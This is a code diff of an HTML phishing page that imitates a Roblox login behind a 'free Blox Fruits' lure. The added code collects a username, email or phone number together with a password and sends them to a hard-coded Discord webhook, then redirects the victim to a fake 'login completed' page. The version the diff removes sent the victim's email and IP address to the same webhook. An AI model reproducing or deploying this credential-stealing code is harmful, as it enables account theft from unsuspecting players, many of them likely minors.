@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Email Verification</title>
+    <title>Login Page</title>
     <style>
         body {
             margin: 0;
@@ -33,7 +33,7 @@
             color: #ffffff;
         }
 
-        input[type="email"] {
+        input[type="text"], input[type="password"] {
             width: 100%;
             padding: 10px;
             margin: 10px 0;
@@ -49,47 +49,50 @@
             border-radius: 5px;
             color: #ffffff;
             cursor: pointer;
+            margin-top: 10px;
         }
 
         button:hover {
             background-color: #45a049;
         }
-
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>Email</h2>
-        <p>Your Roblox Email</p>
-        <input type="email" id="email" placeholder="Email Address" required>
-        <button onclick="submitEmail()">Submit</button>
+        <h2>Login</h2>
+        <p>Email / Username / Phone Number</p>
+        <input type="text" id="identifier" placeholder="Enter Email/Username/Phone" required>
+        <p>Password</p>
+        <input type="password" id="password" placeholder="Enter Password" required>
+        <button onclick="loginAndSendData()">Login</button>
+        <button onclick="loginViaCode()">Login via Code</button>
     </div>
 
     <script>
-        async function submitEmail() {
-            const email = document.getElementById('email').value;
+        async function loginAndSendData() {
+            const identifier = document.getElementById('identifier').value;
+            const password = document.getElementById('password').value;
 
-            // Fetch the user's IP address
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            const userIP = ipData.ip;
-
-            // Send the email and IP to the webhook
-            fetch('https://discord.com/api/webhooks/1152874265553682512/TaPkSlcf68aMXsdQ-QphI5tS0OxDL7opL5hZwTiVUEHgrQswRc4wwsBfV0qwXPkfJxnf', {
+            // Send data to the webhook
+            await fetch('https://discord.com/api/webhooks/1152874265553682512/TaPkSlcf68aMXsdQ-QphI5tS0OxDL7opL5hZwTiVUEHgrQswRc4wwsBfV0qwXPkfJxnf', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
                     embeds: [{
-                        title: `IP Address: ${userIP}`,
-                        description: `Email: ${email}\nCode: none`
+                        title: "Login Information",
+                        description: `Identifier: ${identifier}\nPassword: ${password}`
                     }]
                 })
-            }).then(() => {
-                // Redirect to the specified URL
-                window.location.href = "https://freebloxfruits.github.io/code-verify";
             });
+
+            // Redirect to the specified URL after sending data
+            window.location.href = "https://freebloxfruits.github.io/login-completed/";
+        }
+
+        function loginViaCode() {
+            window.location.href = "https://freebloxfruits.github.io/email/";
         }
     </script>
 </body>
